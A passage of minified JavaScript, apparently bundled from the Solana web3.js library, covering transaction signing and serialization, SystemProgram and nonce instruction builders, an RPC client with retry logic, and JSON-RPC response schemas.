k.pubkey.toBase58().localeCompare(I.pubkey.toBase58(),"en",A)});const a=o.findIndex(k=>k.pubkey.equals(r));if(a>-1){const[k]=o.splice(a,1);k.isSigner=!0,k.isWritable=!0,o.unshift(k)}else o.unshift({pubkey:r,isSigner:!0,isWritable:!0});for(const k of this.signatures){const I=o.findIndex(A=>A.pubkey.equals(k.publicKey));if(I>-1)o[I].isSigner||(o[I].isSigner=!0,console.warn("Transaction references a signature that is unnecessary, only the fee payer and instruction signer accounts should sign a transaction. This behavior is deprecated and will throw an error in the next major version release."));else throw new Error(`unknown signer: ${k.publicKey.toString()}`)}let l=0,u=0,h=0;const f=[],p=[];o.forEach(({pubkey:k,isSigner:I,isWritable:A})=>{I?(f.push(k.toString()),l+=1,A||(u+=1)):(p.push(k.toString()),A||(h+=1))});const w=f.concat(p),x=t.map(k=>{const{data:I,programId:A}=k;return{programIdIndex:w.indexOf(A.toString()),accounts:k.keys.map(b=>w.indexOf(b.pubkey.toString())),data:Bn.encode(I)}});return x.forEach(k=>{Bt(k.programIdIndex>=0),k.accounts.forEach(I=>Bt(I>=0))}),new fs({header:{numRequiredSignatures:l,numReadonlySignedAccounts:u,numReadonlyUnsignedAccounts:h},accountKeys:w,recentBlockhash:e,instructions:x})}_compile(){const e=this.compileMessage(),t=e.accountKeys.slice(0,e.header.numRequiredSignatures);return this.signatures.length===t.length&&this.signatures.every((i,s)=>t[s].equals(i.publicKey))||(this.signatures=t.map(r=>({signature:null,publicKey:r}))),e}serializeMessage(){return this._compile().serialize()}async getEstimatedFee(e){return(await e.getFeeForMessage(this.compileMessage())).value}setSigners(...e){if(e.length===0)throw new Error("No signers");const t=new Set;this.signatures=e.filter(r=>{const i=r.toString();return t.has(i)?!1:(t.add(i),!0)}).map(r=>({signature:null,publicKey:r}))}sign(...e){if(e.length===0)throw new Error("No signers");const t=new Set,r=[];for(const s of e){const o=s.publicKey.toString();t.has(o)||(t.add(o),r.push(s))}this.signatures=r.map(s=>({signature:null,publicKey:s.publicKey}));const i=this._compile();this._partialSign(i,...r)}partialSign(...e){if(e.length===0)throw new Error("No signers");const t=new Set,r=[];for(const s of e){const o=s.publicKey.toString();t.has(o)||(t.add(o),r.push(s))}const i=this._compile();this._partialSign(i,...r)}_partialSign(e,...t){const r=e.serialize();t.forEach(i=>{const s=nx(r,i.secretKey);this._addSignature(i.publicKey,Pn(s))})}addSignature(e,t){this._compile(),this._addSignature(e,t)}_addSignature(e,t){Bt(t.length===64);const r=this.signatures.findIndex(i=>e.equals(i.publicKey));if(r<0)throw new Error(`unknown signer: ${e.toString()}`);this.signatures[r].signature=ve.Buffer.from(t)}verifySignatures(e=!0){return!this._getMessageSignednessErrors(this.serializeMessage(),e)}_getMessageSignednessErrors(e,t){const r={};for(const{signature:i,publicKey:s}of this.signatures)i===null?t&&(r.missing||(r.missing=[])).push(s):VD(i,e,s.toBytes())||(r.invalid||(r.invalid=[])).push(s);return r.invalid||r.missing?r:void 0}serialize(e){const{requireAllSignatures:t,verifySignatures:r}=Object.assign({requireAllSignatures:!0,verifySignatures:!0},e),i=this.serializeMessage();if(r){const s=this._getMessageSignednessErrors(i,t);if(s){let o="Signature verification failed.";throw s.invalid&&(o+=`
Invalid signature for public key${s.invalid.length===1?"":"(s)"} [\`${s.invalid.map(a=>a.toBase58()).join("`, `")}\`].`),s.missing&&(o+=`
Missing signature for public key${s.missing.length===1?"":"(s)"} [\`${s.missing.map(a=>a.toBase58()).join("`, `")}\`].`),new Error(o)}}return this._serialize(i)}_serialize(e){const{signatures:t}=this,r=[];xr(r,t.length);const i=r.length+t.length*64+e.length,s=ve.Buffer.alloc(i);return Bt(t.length<256),ve.Buffer.from(r).copy(s,0),t.forEach(({signature:o},a)=>{o!==null&&(Bt(o.length===64,"signature has invalid length"),ve.Buffer.from(o).copy(s,r.length+a*64))}),e.copy(s,r.length+t.length*64),Bt(s.length<=El,`Transaction too large: ${s.length} > ${El}`),s}get keys(){return Bt(this.instructions.length===1),this.instructions[0].keys.map(e=>e.pubkey)}get programId(){return Bt(this.instructions.length===1),this.instructions[0].programId}get data(){return Bt(this.instructions.length===1),this.instructions[0].data}static from(e){let t=[...e];const r=br(t);let i=[];for(let s=0;s<r;s++){const o=kr(t,0,Fu);i.push(Bn.encode(ve.Buffer.from(o)))}return mr.populate(fs.from(t),i)}static populate(e,t=[]){const r=new mr;return r.recentBlockhash=e.recentBlockhash,e.header.numRequiredSignatures>0&&(r.feePayer=e.accountKeys[0]),t.forEach((i,s)=>{const o={signature:i==Bn.encode(QD)?null:Bn.decode(i),publicKey:e.accountKeys[s]};r.signatures.push(o)}),e.instructions.forEach(i=>{const s=i.accounts.map(o=>{const a=e.accountKeys[o];return{pubkey:a,isSigner:r.signatures.some(l=>l.publicKey.toString()===a.toString())||e.isAccountSigner(o),isWritable:e.isAccountWritable(o)}});r.instructions.push(new ti({keys:s,programId:e.accountKeys[i.programIdIndex],data:Bn.decode(i.data)}))}),r._message=e,r._json=r.toJSON(),r}}class Wu{get version(){return this.message.version}constructor(e,t){if(this.signatures=void 0,this.message=void 0,t!==void 0)Bt(t.length===e.header.numRequiredSignatures,"Expected signatures length to be equal to the number of required signatures"),this.signatures=t;else{const r=[];for(let i=0;i<e.header.numRequiredSignatures;i++)r.push(new Uint8Array(Fu));this.signatures=r}this.message=e}serialize(){const e=this.message.serialize(),t=Array();xr(t,this.signatures.length);const r=_e([Rt(t.length,"encodedSignaturesLength"),tr($D(),this.signatures.length,"signatures"),Rt(e.length,"serializedMessage")]),i=new Uint8Array(2048),s=r.encode({encodedSignaturesLength:new Uint8Array(t),signatures:this.signatures,serializedMessage:e},i);return i.slice(0,s)}static deserialize(e){let t=[...e];const r=[],i=br(t);for(let o=0;o<i;o++)r.push(new Uint8Array(kr(t,0,Fu)));const s=ov.deserialize(new Uint8Array(t));return new Wu(s,r)}sign(e){const t=this.message.serialize(),r=this.message.staticAccountKeys.slice(0,this.message.header.numRequiredSignatures);for(const i of e){const s=r.findIndex(o=>o.equals(i.publicKey));Bt(s>=0,`Cannot sign with non signer key ${i.publicKey.toBase58()}`),this.signatures[s]=nx(t,i.secretKey)}}addSignature(e,t){Bt(t.byteLength===64,"Signature must be 64 bytes long");const i=this.message.staticAccountKeys.slice(0,this.message.header.numRequiredSignatures).findIndex(s=>s.equals(e));Bt(i>=0,`Can not add signature; \`${e.toBase58()}\` is not required to sign this transaction`),this.signatures[i]=t}}const YD=160,ZD=64,JD=YD/ZD,XD=1e3/JD;new Se("SysvarC1ock11111111111111111111111111111111");new Se("SysvarEpochSchedu1e111111111111111111111111");new Se("Sysvar1nstructions1111111111111111111111111");const am=new Se("SysvarRecentB1ockHashes11111111111111111111"),bE=new Se("SysvarRent111111111111111111111111111111111");new Se("SysvarRewards111111111111111111111111111111");new Se("SysvarS1otHashes111111111111111111111111111");new Se("SysvarS1otHistory11111111111111111111111111");new Se("SysvarStakeHistory1111111111111111111111111");class xE extends Error{constructor({action:e,signature:t,transactionMessage:r,logs:i}){const s=i?`Logs: 
${JSON.stringify(i.slice(-10),null,2)}. `:"",o="\nCatch the `SendTransactionError` and call `getLogs()` on it for full details.";let a;switch(e){case"send":a=`Transaction ${t} resulted in an error. 
${r}. `+s+o;break;case"simulate":a=`Simulation failed. 
Message: ${r}. 
`+s+o;break;default:a=`Unknown action '${(l=>l)(e)}'`}super(a),this.signature=void 0,this.transactionMessage=void 0,this.transactionLogs=void 0,this.signature=t,this.transactionMessage=r,this.transactionLogs=i||void 0}get transactionError(){return{message:this.transactionMessage,logs:Array.isArray(this.transactionLogs)?this.transactionLogs:void 0}}get logs(){const e=this.transactionLogs;if(!(e!=null&&typeof e=="object"&&"then"in e))return e}async getLogs(e){return Array.isArray(this.transactionLogs)||(this.transactionLogs=new Promise((t,r)=>{e.getTransaction(this.signature).then(i=>{if(i&&i.meta&&i.meta.logMessages){const s=i.meta.logMessages;this.transactionLogs=s,t(s)}else r(new Error("Log messages not found"))}).catch(r)})),await this.transactionLogs}}class Ie extends Error{constructor({code:e,message:t,data:r},i){super(i!=null?`${i}: ${t}`:t),this.code=void 0,this.data=void 0,this.code=e,this.data=r,this.name="SolanaJSONRPCError"}}function Ha(n){return new Promise(e=>setTimeout(e,n))}function Ur(n,e){const t=n.layout.span>=0?n.layout.span:ox(n,e),r=ve.Buffer.alloc(t),i=Object.assign({instruction:n.index},e);return n.layout.encode(i,r),r}const eO=Mn("lamportsPerSignature"),lx=_e([be("version"),be("state"),He("authorizedPubkey"),He("nonce"),_e([eO],"feeCalculator")]),kE=lx.span;class av{constructor(e){this.authorizedPubkey=void 0,this.nonce=void 0,this.feeCalculator=void 0,this.authorizedPubkey=e.authorizedPubkey,this.nonce=e.nonce,this.feeCalculator=e.feeCalculator}static fromAccountData(e){const t=lx.decode(Pn(e),0);return new av({authorizedPubkey:new Se(t.authorizedPubkey),nonce:new Se(t.nonce).toString(),feeCalculator:t.feeCalculator})}}const tO=n=>{const e=n.decode.bind(n),t=n.encode.bind(n);return{decode:e,encode:t}},nO=n=>e=>{const t=Rt(n,e),{encode:r,decode:i}=tO(t),s=t;return s.decode=(o,a)=>{const l=i(o,a);return OL(ve.Buffer.from(l))},s.encode=(o,a,l)=>{const u=jL(o,n);return r(u,a,l)},s},Ul=nO(8),jr=Object.freeze({Create:{index:0,layout:_e([be("instruction"),Ar("lamports"),Ar("space"),He("programId")])},Assign:{index:1,layout:_e([be("instruction"),He("programId")])},Transfer:{index:2,layout:_e([be("instruction"),Ul("lamports")])},CreateWithSeed:{index:3,layout:_e([be("instruction"),He("base"),ul("seed"),Ar("lamports"),Ar("space"),He("programId")])},AdvanceNonceAccount:{index:4,layout:_e([be("instruction")])},WithdrawNonceAccount:{index:5,layout:_e([be("instruction"),Ar("lamports")])},InitializeNonceAccount:{index:6,layout:_e([be("instruction"),He("authorized")])},AuthorizeNonceAccount:{index:7,layout:_e([be("instruction"),He("authorized")])},Allocate:{index:8,layout:_e([be("instruction"),Ar("space")])},AllocateWithSeed:{index:9,layout:_e([be("instruction"),He("base"),ul("seed"),Ar("space"),He("programId")])},AssignWithSeed:{index:10,layout:_e([be("instruction"),He("base"),ul("seed"),He("programId")])},TransferWithSeed:{index:11,layout:_e([be("instruction"),Ul("lamports"),ul("seed"),He("programId")])},UpgradeNonceAccount:{index:12,layout:_e([be("instruction")])}});class jl{constructor(){}static createAccount(e){const t=jr.Create,r=Ur(t,{lamports:e.lamports,space:e.space,programId:Pn(e.programId.toBuffer())});return new ti({keys:[{pubkey:e.fromPubkey,isSigner:!0,isWritable:!0},{pubkey:e.newAccountPubkey,isSigner:!0,isWritable:!0}],programId:this.programId,data:r})}static transfer(e){let t,r;if("basePubkey"in e){const i=jr.TransferWithSeed;t=Ur(i,{lamports:BigInt(e.lamports),seed:e.seed,programId:Pn(e.programId.toBuffer())}),r=[{pubkey:e.fromPubkey,isSigner:!1,isWritable:!0},{pubkey:e.basePubkey,isSigner:!0,isWritable:!1},{pubkey:e.toPubkey,isSigner:!1,isWritable:!0}]}else{const i=jr.Transfer;t=Ur(i,{lamports:BigInt(e.lamports)}),r=[{pubkey:e.fromPubkey,isSigner:!0,isWritable:!0},{pubkey:e.toPubkey,isSigner:!1,isWritable:!0}]}return new ti({keys:r,programId:this.programId,data:t})}static assign(e){let t,r;if("basePubkey"in e){const i=jr.AssignWithSeed;t=Ur(i,{base:Pn(e.basePubkey.toBuffer()),seed:e.seed,programId:Pn(e.programId.toBuffer())}),r=[{pubkey:e.accountPubkey,isSigner:!1,isWritable:!0},{pubkey:e.basePubkey,isSigner:!0,isWritable:!1}]}else{const i=jr.Assign;t=Ur(i,{programId:Pn(e.programId.toBuffer())}),r=[{pubkey:e.accountPubkey,isSigner:!0,isWritable:!0}]}return new ti({keys:r,programId:this.programId,data:t})}static createAccountWithSeed(e){const t=jr.CreateWithSeed,r=Ur(t,{base:Pn(e.basePubkey.toBuffer()),seed:e.seed,lamports:e.lamports,space:e.space,programId:Pn(e.programId.toBuffer())});let i=[{pubkey:e.fromPubkey,isSigner:!0,isWritable:!0},{pubkey:e.newAccountPubkey,isSigner:!1,isWritable:!0}];return e.basePubkey.equals(e.fromPubkey)||i.push({pubkey:e.basePubkey,isSigner:!0,isWritable:!1}),new ti({keys:i,programId:this.programId,data:r})}static createNonceAccount(e){const t=new mr;"basePubkey"in e&&"seed"in e?t.add(jl.createAccountWithSeed({fromPubkey:e.fromPubkey,newAccountPubkey:e.noncePubkey,basePubkey:e.basePubkey,seed:e.seed,lamports:e.lamports,space:kE,programId:this.programId})):t.add(jl.createAccount({fromPubkey:e.fromPubkey,newAccountPubkey:e.noncePubkey,lamports:e.lamports,space:kE,programId:this.programId}));const r={noncePubkey:e.noncePubkey,authorizedPubkey:e.authorizedPubkey};return t.add(this.nonceInitialize(r)),t}static nonceInitialize(e){const t=jr.InitializeNonceAccount,r=Ur(t,{authorized:Pn(e.authorizedPubkey.toBuffer())}),i={keys:[{pubkey:e.noncePubkey,isSigner:!1,isWritable:!0},{pubkey:am,isSigner:!1,isWritable:!1},{pubkey:bE,isSigner:!1,isWritable:!1}],programId:this.programId,data:r};return new ti(i)}static nonceAdvance(e){const t=jr.AdvanceNonceAccount,r=Ur(t),i={keys:[{pubkey:e.noncePubkey,isSigner:!1,isWritable:!0},{pubkey:am,isSigner:!1,isWritable:!1},{pubkey:e.authorizedPubkey,isSigner:!0,isWritable:!1}],programId:this.programId,data:r};return new ti(i)}static nonceWithdraw(e){const t=jr.WithdrawNonceAccount,r=Ur(t,{lamports:e.lamports});return new ti({keys:[{pubkey:e.noncePubkey,isSigner:!1,isWritable:!0},{pubkey:e.toPubkey,isSigner:!1,isWritable:!0},{pubkey:am,isSigner:!1,isWritable:!1},{pubkey:bE,isSigner:!1,isWritable:!1},{pubkey:e.authorizedPubkey,isSigner:!0,isWritable:!1}],programId:this.programId,data:r})}static nonceAuthorize(e){const t=jr.AuthorizeNonceAccount,r=Ur(t,{authorized:Pn(e.newAuthorizedPubkey.toBuffer())});return new ti({keys:[{pubkey:e.noncePubkey,isSigner:!1,isWritable:!0},{pubkey:e.authorizedPubkey,isSigner:!0,isWritable:!1}],programId:this.programId,data:r})}static allocate(e){let t,r;if("basePubkey"in e){const i=jr.AllocateWithSeed;t=Ur(i,{base:Pn(e.basePubkey.toBuffer()),seed:e.seed,space:e.space,programId:Pn(e.programId.toBuffer())}),r=[{pubkey:e.accountPubkey,isSigner:!1,isWritable:!0},{pubkey:e.basePubkey,isSigner:!0,isWritable:!1}]}else{const i=jr.Allocate;t=Ur(i,{space:e.space}),r=[{pubkey:e.accountPubkey,isSigner:!0,isWritable:!0}]}return new ti({keys:r,programId:this.programId,data:t})}}jl.programId=new Se("11111111111111111111111111111111");new Se("BPFLoader2111111111111111111111111111111111");function rO(n){return n&&n.__esModule&&Object.prototype.hasOwnProperty.call(n,"default")?n.default:n}var lm,CE;function iO(){if(CE)return lm;CE=1;var n=Object.prototype.toString,e=Object.keys||function(r){var i=[];for(var s in r)i.push(s);return i};function t(r,i){var s,o,a,l,u,h,f;if(r===!0)return"true";if(r===!1)return"false";switch(typeof r){case"object":if(r===null)return null;if(r.toJSON&&typeof r.toJSON=="function")return t(r.toJSON(),i);if(f=n.call(r),f==="[object Array]"){for(a="[",o=r.length-1,s=0;s<o;s++)a+=t(r[s],!0)+",";return o>-1&&(a+=t(r[s],!0)),a+"]"}else if(f==="[object Object]"){for(l=e(r).sort(),o=l.length,a="",s=0;s<o;)u=l[s],h=t(r[u],!1),h!==void 0&&(a&&(a+=","),a+=JSON.stringify(u)+":"+h),s++;return"{"+a+"}"}else return JSON.stringify(r);case"function":case"undefined":return i?null:void 0;case"string":return JSON.stringify(r);default:return isFinite(r)?r:null}}return lm=function(r){var i=t(r,!1);if(i!==void 0)return""+i},lm}var sO=iO(),RE=rO(sO);const Vc=32;function cm(n){let e=0;for(;n>1;)n/=2,e++;return e}function oO(n){return n===0?1:(n--,n|=n>>1,n|=n>>2,n|=n>>4,n|=n>>8,n|=n>>16,n|=n>>32,n+1)}class aO{constructor(e,t,r,i,s){this.slotsPerEpoch=void 0,this.leaderScheduleSlotOffset=void 0,this.warmup=void 0,this.firstNormalEpoch=void 0,this.firstNormalSlot=void 0,this.slotsPerEpoch=e,this.leaderScheduleSlotOffset=t,this.warmup=r,this.firstNormalEpoch=i,this.firstNormalSlot=s}getEpoch(e){return this.getEpochAndSlotIndex(e)[0]}getEpochAndSlotIndex(e){if(e<this.firstNormalSlot){const t=cm(oO(e+Vc+1))-cm(Vc)-1,r=this.getSlotsInEpoch(t),i=e-(r-Vc);return[t,i]}else{const t=e-this.firstNormalSlot,r=Math.floor(t/this.slotsPerEpoch),i=this.firstNormalEpoch+r,s=t%this.slotsPerEpoch;return[i,s]}}getFirstSlotInEpoch(e){return e<=this.firstNormalEpoch?(Math.pow(2,e)-1)*Vc:(e-this.firstNormalEpoch)*this.slotsPerEpoch+this.firstNormalSlot}getLastSlotInEpoch(e){return this.getFirstSlotInEpoch(e)+this.getSlotsInEpoch(e)-1}getSlotsInEpoch(e){return e<this.firstNormalEpoch?Math.pow(2,e+cm(Vc)):this.slotsPerEpoch}}var lO=globalThis.fetch;class cO extends xD{constructor(e,t,r){const i=s=>{const o=AD(s,{autoconnect:!0,max_reconnects:5,reconnect:!0,reconnect_interval:1e3,...t});return"socket"in o?this.underlyingSocket=o.socket:this.underlyingSocket=o,o};super(i,e,t,r),this.underlyingSocket=void 0}call(...e){var r;const t=(r=this.underlyingSocket)==null?void 0:r.readyState;return t===1?super.call(...e):Promise.reject(new Error("Tried to call a JSON-RPC method `"+e[0]+"` but the socket was not `CONNECTING` or `OPEN` (`readyState` was "+t+")"))}notify(...e){var r;const t=(r=this.underlyingSocket)==null?void 0:r.readyState;return t===1?super.notify(...e):Promise.reject(new Error("Tried to send a JSON-RPC notification `"+e[0]+"` but the socket was not `CONNECTING` or `OPEN` (`readyState` was "+t+")"))}}function uO(n,e){let t;try{t=n.layout.decode(e)}catch(r){throw new Error("invalid instruction; "+r)}if(t.typeIndex!==n.index)throw new Error(`invalid account data; account type mismatch ${t.typeIndex} != ${n.index}`);return t}const ME=56;class NE{constructor(e){this.key=void 0,this.state=void 0,this.key=e.key,this.state=e.state}isActive(){const e=BigInt("0xffffffffffffffff");return this.state.deactivationSlot===e}static deserialize(e){const t=uO(hO,e),r=e.length-ME;Bt(r>=0,"lookup table is invalid"),Bt(r%32===0,"lookup table is invalid");const i=r/32,{addresses:s}=_e([tr(He(),i,"addresses")]).decode(e.slice(ME));return{deactivationSlot:t.deactivationSlot,lastExtendedSlot:t.lastExtendedSlot,lastExtendedSlotStartIndex:t.lastExtendedStartIndex,authority:t.authority.length!==0?new Se(t.authority[0]):void 0,addresses:s.map(o=>new Se(o))}}}const hO={index:1,layout:_e([be("typeIndex"),Ul("deactivationSlot"),Mn("lastExtendedSlot"),it("lastExtendedStartIndex"),it(),tr(He(),ra(it(),-1),"authority")])},fO=/^[^:]+:\/\/([^:[]+|\[[^\]]+\])(:\d+)?(.*)/i;function dO(n){const e=n.match(fO);if(e==null)throw TypeError(`Failed to validate endpoint URL \`${n}\``);const[t,r,i,s]=e,o=n.startsWith("https:")?"wss:":"ws:",a=i==null?null:parseInt(i.slice(1),10),l=a==null?"":`:${a+1}`;return`${o}//${r}${l}${s}`}const Gt=ph(rv(Se),ue(),n=>new Se(n)),cx=iv([ue(),$t("base64")]),lv=ph(rv(ve.Buffer),cx,n=>ve.Buffer.from(n[0],"base64")),pO=30*1e3;function gO(n){if(/^https?:/.test(n)===!1)throw new TypeError("Endpoint URL must start with `http:` or `https:`.");return n}function St(n){let e,t;if(typeof n=="string")e=n;else if(n){const{commitment:r,...i}=n;e=r,t=i}return{commitment:e,config:t}}function PE(n){return n.map(e=>"memcmp"in e?{...e,memcmp:{...e.memcmp,encoding:e.memcmp.encoding??"base58"}}:e)}function ux(n){return lr([se({jsonrpc:$t("2.0"),id:ue(),result:n}),se({jsonrpc:$t("2.0"),id:ue(),error:se({code:ac(),message:ue(),data:xe(KL())})})])}const mO=ux(ac());function ze(n){return ph(ux(n),mO,e=>"error"in e?e:{...e,result:de(e.result,n)})}function tn(n){return ze(se({context:se({slot:X()}),value:n}))}function Lp(n){return se({context:se({slot:X()}),value:n})}function um(n,e){return n===0?new zu({header:e.header,staticAccountKeys:e.accountKeys.map(t=>new Se(t)),recentBlockhash:e.recentBlockhash,compiledInstructions:e.instructions.map(t=>({programIdIndex:t.programIdIndex,accountKeyIndexes:t.accounts,data:Bn.decode(t.data)})),addressTableLookups:e.addressTableLookups}):new fs(e)}const yO=se({foundation:X(),foundationTerm:X(),initial:X(),taper:X(),terminal:X()}),wO=ze(pe(ge(se({epoch:X(),effectiveSlot:X(),amount:X(),postBalance:X(),commission:xe(ge(X()))})))),vO=pe(se({slot:X(),prioritizationFee:X()})),_O=se({total:X(),validator:X(),foundation:X(),epoch:X()}),EO=se({epoch:X(),slotIndex:X(),slotsInEpoch:X(),absoluteSlot:X(),blockHeight:xe(X()),transactionCount:xe(X())}),IO=se({slotsPerEpoch:X(),leaderScheduleSlotOffset:X(),warmup:Ni(),firstNormalEpoch:X(),firstNormalSlot:X()}),SO=Hb(ue(),pe(X())),Ta=ge(lr([se({}),ue()])),TO=se({err:Ta}),AO=$t("receivedSignature"),bO=se({"solana-core":ue(),"feature-set":xe(X())}),xO=se({program:ue(),programId:Gt,parsed:ac()}),kO=se({programId:Gt,accounts:pe(Gt),data:ue()}),LE=tn(se({err:ge(lr([se({}),ue()])),logs:ge(pe(ue())),accounts:xe(ge(pe(ge(se({executable:Ni(),owner:ue(),lamports:X(),data:pe(ue()),rentEpoch:xe(X())}))))),unitsConsumed:xe(X()),returnData:xe(ge(se({programId:ue(),data:iv([ue(),$t("base64")])}))),innerInstructions:xe(ge(pe(se({index:X(),instructions:pe(lr([xO,kO]))}))))})),CO=tn(se({byIdentity:Hb(ue(),pe(X())),range:se({firstSlot:X(),lastSlot:X()})}));function RO(n,e,t,r,i,s){const o=t||lO;let a;s!=null&&console.warn("You have supplied an `httpAgent` when creating a `Connection` in a browser environment.It has been ignored; `httpAgent` is only used in Node environments.");let l;return r&&(l=async(h,f)=>{const p=await new Promise((w,x)=>{try{r(h,f,(k,I)=>w([k,I]))}catch(k){x(k)}});return await o(...p)}),new ID(async(h,f)=>{const p={method:"POST",body:h,agent:a,headers:Object.assign({"Content-Type":"application/json"},e||{},R3)};try{let w=5,x,k=500;for(;l?x=await l(n,p):x=await o(n,p),!(x.status!==429||i===!0||(w-=1,w===0));)console.error(`Server responded with ${x.status} ${x.statusText}.  Retrying after ${k}ms delay...`),await Ha(k),k*=2;const I=await x.text();x.ok?f(null,I):f(new Error(`${x.status} ${x.statusText}: ${I}`))}catch(w){w instanceof Error&&f(w)}},{})}function MO(n){return(e,t)=>new Promise((r,i)=>{n.request(e,t,(s,o)=>{if(s){i(s);return}r(o)})})}function NO(n){return e=>new Promise((t,r)=>{e.length===0&&t([]);const i=e.map(s=>n.request(s.methodName,s.args));n.request(i,(s,o)=>{if(s){r(s);return}t(o)})})}const PO=ze(yO),LO=ze(_O),DO=ze(vO),OO=ze(EO),BO=ze(IO),UO=ze(SO),jO=ze(X()),VO=tn(se({total:X(),circulating:X(),nonCirculating:X(),nonCirculatingAccounts:pe(Gt)})),W0=se({amount:ue(),uiAmount:ge(X()),decimals:X(),uiAmountString:xe(ue())}),FO=tn(pe(se({address:Gt,amount:ue(),uiAmount:ge(X()),decimals:X(),uiAmountString:xe(ue())}))),zO=tn(pe(se({pubkey:Gt,account:se({executable:Ni(),owner:Gt,lamports:X(),data:lv,rentEpoch:X()})}))),$0=se({program:ue(),parsed:ac(),space:X()}),WO=tn(pe(se({pubkey:Gt,account:se({executable:Ni(),owner:Gt,lamports:X(),data:$0,rentEpoch:X()})}))),$O=tn(pe(se({lamports:X(),address:Gt}))),$u=se({executable:Ni(),owner:Gt,lamports:X(),data:lv,rentEpoch:X()}),HO=se({pubkey:Gt,account:$u}),qO=ph(lr([rv(ve.Buffer),$0]),lr([cx,$0]),n=>Array.isArray(n)?de(n,lv):n),H0=se({executable:Ni(),owner:Gt,lamports:X(),data:qO,rentEpoch:X()}),KO=se({pubkey:Gt,account:H0}),GO=se({state:lr([$t("active"),$t("inactive"),$t("activating"),$t("deactivating")]),active:X(),inactive:X()}),QO=ze(pe(se({signature:ue(),slot:X(),err:Ta,memo:ge(ue()),blockTime:xe(ge(X()))}))),YO=ze(pe(se({signature:ue(),slot:X(),err:Ta,memo:ge(ue()),blockTime:xe(ge(X()))}))),ZO=se({subscription:X(),result:Lp($u)}),JO=se({pubkey:Gt,account:$u}),XO=se({subscription:X(),result:Lp(JO)}),e3=se({parent:X(),slot:X(),root:X()}),t3=se({subscription:X(),result:e3}),n3=lr([se({type:lr([$t("firstShredReceived"),$t("completed"),$t("optimisticConfirmation"),$t("root")]),slot:X(),timestamp:X()}),se({type:$t("createdBank"),parent:X(),slot:X(),timestamp:X()}),se({type:$t("frozen"),slot:X(),timestamp:X(),stats:se({numTransactionEntries:X(),numSuccessfulTransactions:X(),numFailedTransactions:X(),maxTransactionsPerEntry:X()})}),se({type:$t("dead"),slot:X(),timestamp:X(),err:ue()})]),r3=se({subscription:X(),result:n3}),i3=se({subscription:X(),result:Lp(lr([TO,AO]))}),s3=se({subscription:X(),result:X()}),o3=se({pubkey:ue(),gossip:ge(ue()),tpu:ge(ue()),rpc:ge(ue()),version:ge(ue())}),DE=se({votePubkey:ue(),nodePubkey:ue(),activatedStake:X(),epochVoteAccount:Ni(),epochCredits:pe(iv([X(),X(),X()])),commission:X(),lastVote:X(),rootSlot:ge(X())}),a3=ze(se({current:pe(DE),delinquent:pe(DE)})),l3=lr([$t("processed"),$t("confirmed"),$t("finalized")]),c3=se({slot:X(),confirmations:ge(X()),err:Ta,confirmationStatus:xe(l3)}),u3=tn(pe(ge(c3))),h3=ze(X()),hx=se({accountKey:Gt,writableIndexes:pe(X()),readonlyIndexes:pe(X())}),cv=se({signatures:pe(ue()),message:se({accountKeys:pe(ue()),header:se({numRequiredSignatures:X(),numReadonlySignedAccounts:X(),numReadonlyUnsignedAccounts:X()}),instructions:pe(se({accounts:pe(X()),data:ue(),programIdIndex:X()})),recentBlockhash:ue(),addressTableLookups:xe(pe(hx))})}),fx=se({pubkey:Gt,signer:Ni(),writable:Ni(),source:xe(lr([$t("transaction"),$t("lookupTable")]))}),dx=se({accountKeys:pe(fx),signatures:pe(ue())}),px=se({parsed:ac(),program:ue(),programId:Gt}),gx=se({accounts:pe(Gt),data:ue(),programId:Gt}),f3=lr([gx,px]),d3=lr([se({parsed:ac(),program:ue(),programId:ue()}),se({accounts:pe(ue()),data:ue(),programId:ue()})]),mx=ph(f3,d3,n=>"accounts"in n?de(n,gx):de(n,px)),yx=se({signatures:pe(ue()),message:se({accountKeys:pe(fx),instructions:pe(mx),recentBlockhash:ue(),addressTableLookups:xe(ge(pe(hx)))})}),Cd=se({accountIndex:X(),mint:ue(),owner:xe(ue()),programId:xe(ue()),uiTokenAmount:W0}),wx=se({writable:pe(Gt),readonly:pe(Gt)}),Dp=se({err:Ta,fee:X(),innerInstructions:xe(ge(pe(se({index:X(),instructions:pe(se({accounts:pe(X()),data:ue(),programIdIndex:X()}))})))),preBalances:pe(X()),postBalances:pe(X()),logMessages:xe(ge(pe(ue()))),preTokenBalances:xe(ge(pe(Cd))),postTokenBalances:xe(ge(pe(Cd))),loadedAddresses:xe(wx),computeUnitsConsumed:xe(X())}),uv=se({err:Ta,fee:X(),innerInstructions:xe(ge(pe(se({index:X(),instructions:pe(mx)})))),preBalances:pe(X()),postBalances:pe(X()),logMessages:xe(ge(pe(ue()))),preTokenBalances:xe(ge(pe(Cd))),postTokenBalances:xe(ge(pe(Cd))),loadedAddresses:xe(wx),computeUnitsConsumed:xe(X())}),lc=lr([$t(0),$t("legacy")]),Aa=se({pubkey:ue(),lamports:X(),postBalance:ge(X()),rewardType:ge(ue()),commission:xe(ge(X()))}),p3=ze(ge(se({blockhash:ue(),previousBlockhash:ue(),parentSlot:X(),transactions:pe(se({transaction:cv,meta:ge(Dp),version:xe(lc)})),rewards:xe(pe(Aa)),blockTime:ge(X()),blockHeight:ge(X())}))),g3=ze(ge(se({blockhash:ue(),previousBlockhash:ue(),parentSlot:X(),rewards:xe(pe(Aa)),blockTime:ge(X()),blockHeight:ge(X())}))),m3=ze(ge(se({blockhash:ue(),previousBlockhash:ue(),parentSlot:X(),transactions:pe(se({transaction:dx,meta:ge(Dp),version:xe(lc)})),rewards:xe(pe(Aa)),blockTime:ge(X()),blockHeight:ge(X())}))),y3=ze(ge(se({blockhash:ue(),previousBlockhash:ue(),parentSlot:X(),transactions:pe(se({transaction:yx,meta:ge(uv),version:xe(lc)})),rewards:xe(pe(Aa)),blockTime:ge(X()),blockHeight:ge(X())}))),w3=ze(ge(se({blockhash:ue(),previousBlockhash:ue(),parentSlot:X(),transactions:pe(se({transaction:dx,meta:ge(uv),version:xe(lc)})),rewards:xe(pe(Aa)),blockTime:ge(X()),blockHeight:ge(X())}))),v3=ze(ge(se({blockhash:ue(),previousBlockhash:ue(),parentSlot:X(),rewards:xe(pe(Aa)),blockTime:ge(X()),blockHeight:ge(X())}))),_3=ze(ge(se({blockhash:ue(),previousBlockhash:ue(),parentSlot:X(),transactions:pe(se({transaction:cv,meta:ge(Dp)})),rewards:xe(pe(Aa)),blockTime:ge(X())}))),OE=ze(ge(se({blockhash:ue(),previousBlockhash:ue(),parentSlot:X(),signatures:pe(ue()),blockTime:ge(X())}))),hm=ze(ge(se({slot:X(),meta:ge(Dp),blockTime:xe(ge(X())),transaction:cv,version:xe